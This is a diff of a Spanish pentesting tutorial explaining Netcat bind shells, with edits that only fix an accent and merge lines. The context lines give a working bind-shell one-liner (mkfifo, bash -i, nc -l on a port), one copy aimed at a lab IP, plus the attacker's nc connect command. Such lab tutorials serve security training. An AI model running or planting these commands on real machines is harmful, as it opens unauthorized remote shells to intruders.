@@ -1,4 +1,4 @@
-Un _bind shell_ permite al pentester conectarse a un sistema objetivo a través de su shell. En este caso, el sistema **victima** inicia un _listener_ que espera conexiones entrantes.
+Un _bind shell_ permite al pentester conectarse a un sistema objetivo a través de su shell. En este caso, el sistema **víctima** inicia un _listener_ que espera conexiones entrantes.
 
 1. El objetivo (target) inicia un listener en un puerto específico usando Netcat (nc).
 ```
@@ -20,9 +20,7 @@ nc -nv <IP_objetivo> 7777
 
 ### Estableciendo un bind shell real con Netcat
 
-Para obtener control real del sistema y no solo enviar texto:
-
-En la máquina víctima, se debería ejecutar:
+Para obtener control real del sistema y no solo enviar texto, en la máquina víctima, se debería ejecutar:
 
 ```
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP_víctima> 7777 > /tmp/f
@@ -70,7 +68,6 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.201.1
 El atacante, debe ejecutar:
 ```
 sudo nc -nv <ip_vicitma> <puerto_víctima>
-
 ```
 
 Se establece la conexión exitosamente:
